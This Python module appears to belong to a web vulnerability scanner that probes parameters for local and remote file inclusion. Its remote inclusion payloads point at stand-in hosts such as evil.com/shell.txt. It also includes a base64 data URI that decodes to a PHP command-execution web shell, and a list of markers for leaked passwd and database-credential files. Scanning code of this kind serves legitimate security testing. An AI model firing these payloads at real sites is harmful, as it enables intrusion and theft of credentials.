"""
LFI/RFI Scanner — Path Traversal, Remote File Inclusion
Author: ARIF
"""

import asyncio
import logging
from typing import List, Optional, Dict
from urllib.parse import urlparse, urlencode, parse_qs
from core.engine import Vulnerability, Severity
from core.requester import Requester
from payloads.engine.generator import PayloadGenerator


class LfiScanner:
    def __init__(self, config: Dict):
        self.logger = logging.getLogger(__name__)
        self.config = config
        self.requester = Requester(config)
        self.payload_gen = PayloadGenerator(config)
        self.vulnerabilities = []
        self.results_lock = asyncio.Lock()

    async def scan(self, target: str) -> List[Vulnerability]:
        self.logger.info(f"Starting LFI/RFI scan on {target}")
        self.vulnerabilities = []
        try:
            response = await self.requester.get(target)
            if not response:
                return self.vulnerabilities
            html = await response.text()
            forms = await self.requester.extract_forms(target, html)
            params = await self.requester.extract_parameters(target)

            tasks = []
            for param_name, param_value in params.items():
                tasks.append(self._test_lfi_get(target, param_name, param_value))
                tasks.append(self._test_rfi_get(target, param_name, param_value))

            for form in forms:
                for input_data in form.get("inputs", []):
                    if input_data.get("type") not in ["submit", "button", "image"]:
                        tasks.append(self._test_lfi_post(form["action"], input_data["name"]))

            if tasks:
                await asyncio.gather(*tasks)
        except Exception as e:
            self.logger.error(f"LFI/RFI scan error on {target}: {e}")
        return self.vulnerabilities

    async def _test_lfi_get(self, url: str, param: str, value: str) -> None:
        payloads = self.payload_gen.get_payloads("lfi", limit=80)
        base_response = await self.requester.get(url)
        base_html = ""
        if base_response:
            try:
                base_html = await base_response.text()
            except Exception:
                pass

        for payload in payloads[:50]:
            try:
                test_url = self._inject_param(url, param, payload)
                response = await self.requester.get(test_url)
                if not response:
                    continue
                test_html = await response.text()
                if self._check_lfi_success(test_html, payload, base_html):
                    vuln = Vulnerability(
                        name="Local File Inclusion (LFI)",
                        description=f"LFI vulnerability in parameter '{param}' - possible file disclosure",
                        severity=Severity.HIGH,
                        url=test_url,
                        parameter=param,
                        payload=payload,
                        evidence=f"File content detected in response. Length: {len(test_html)}",
                        remediation="Sanitize file paths. Use whitelist for allowed files. Disable allow_url_include in PHP.",
                        cvss_score=7.5,
                        confidence=0.85,
                        module="lfi"
                    )
                    async with self.results_lock:
                        self.vulnerabilities.append(vuln)
            except Exception as e:
                self.logger.debug(f"LFI test error: {e}")

    async def _test_rfi_get(self, url: str, param: str, value: str) -> None:
        payloads = [
            "http://evil.com/shell.txt?",
            "https://evilsite.com/cmd.txt?",
            "http://192.168.1.1/shell.txt?",
            "//evil.com/shell.txt",
            "http://localhost:8080/test.txt",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
        ]
        for payload in payloads:
            try:
                test_url = self._inject_param(url, param, payload)
                response = await self.requester.get(test_url, timeout=10)
                if response and response.status == 200:
                    test_html = await response.text()
                    if len(test_html) > 100:
                        vuln = Vulnerability(
                            name="Remote File Inclusion (RFI)",
                            description=f"RFI vulnerability in parameter '{param}'",
                            severity=Severity.CRITICAL,
                            url=test_url,
                            parameter=param,
                            payload=payload,
                            evidence=f"Remote content included. Response length: {len(test_html)}",
                            remediation="Disable allow_url_include. Validate input strictly. Use whitelist approach.",
                            cvss_score=9.0,
                            confidence=0.7,
                            module="lfi"
                        )
                        async with self.results_lock:
                            self.vulnerabilities.append(vuln)
            except Exception as e:
                self.logger.debug(f"RFI test error: {e}")

    async def _test_lfi_post(self, url: str, param: str) -> None:
        payloads = self.payload_gen.get_payloads("lfi", limit=30)
        for payload in payloads[:20]:
            try:
                data = {param: payload}
                response = await self.requester.post(url, data=data)
                if not response:
                    continue
                test_html = await response.text()
                if self._check_lfi_success(test_html, payload, ""):
                    vuln = Vulnerability(
                        name="Local File Inclusion (LFI) - POST",
                        description=f"LFI vulnerability in POST parameter '{param}'",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence="File content detected in POST response",
                        remediation="Sanitize file paths. Use whitelist.",
                        cvss_score=7.5,
                        confidence=0.8,
                        module="lfi"
                    )
                    async with self.results_lock:
                        self.vulnerabilities.append(vuln)
            except Exception as e:
                self.logger.debug(f"LFI POST test error: {e}")

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        query_str = f"?{new_query}" if new_query else ""
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}{query_str}"

    def _check_lfi_success(self, html: str, payload: str, base_html: str) -> bool:
        from core.parser import ResponseParser
        parser = ResponseParser(self.config)

        if parser.has_lfi_success(html):
            return True

        lfi_indicators = [
            "root:", "/bin/bash", "/bin/sh", "daemon:", "www-data",
            "nobody:", "admin:", "mysql:", "postgres:",
            "[boot loader]", "[fonts]", "[extensions]",
            "Windows Registry Editor",
            "SYSTEM", "CurrentControlSet",
            "<?xml", "<HTML>", "<BODY>",
            "# MySQL dump", "# phpMyAdmin",
            "DB_HOST", "DB_PASSWORD", "define('DB_",
            "$db['", "mysql_connect",
            "auto_prepend_file", "auto_append_file",
            "allow_url_include", "disable_functions",
            "open_basedir", "error_log"
        ]
        html_lower = html.lower()
        for indicator in lfi_indicators:
            if indicator.lower() in html_lower and indicator.lower() not in (base_html or "").lower():
                return True

        if base_html:
            if len(html) > len(base_html) * 1.5:
                return True
        else:
            if len(html) > 500 and ("root:" in html.lower() or "bin:" in html.lower()):
                return True

        return False
